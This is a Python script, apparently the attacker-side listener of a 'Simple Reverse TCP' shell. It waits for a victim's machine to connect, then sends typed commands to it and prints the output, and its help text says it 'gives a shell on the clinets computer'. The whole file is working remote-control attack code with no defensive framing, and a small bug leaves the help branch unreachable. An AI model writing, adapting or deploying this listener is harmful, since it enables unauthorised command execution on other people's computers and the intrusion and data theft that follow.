import socket
import sys
import time

def loading_animation(duration):
    while duration > 0:
        sys.stdout.write("\r[*]")
        sys.stdout.flush()
        time.sleep(0.5)  # Adjust the sleep duration to control the speed of the animation
        sys.stdout.write("\r[**]")
        sys.stdout.flush()
        time.sleep(0.5)
        sys.stdout.write("\r[***]")
        sys.stdout.flush()
        time.sleep(0.5)
        duration -= 1

    print("\nLoading complete!")

hostServer = input("SERVER IP ADDRESS: ")
hostPort = input("SERVER PORT LISTENER: ")

SERVER_HOST = hostServer
SERVER_PORT = hostPort
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, int(SERVER_PORT)))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print("CONNECTION INCOMING")
loading_animation(8)
print(f"{client_address[0]}:{client_address[1]} Connected!")
print("****************************")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)
print(" ")

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if command.upper() == "help":
        print("Welcome to Simple Reverse TCP")
        print("This script when the clinet runs gives a shell on the clinets computer")
        print("Move around the shell, (NO ROOT ACCESS!)")
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
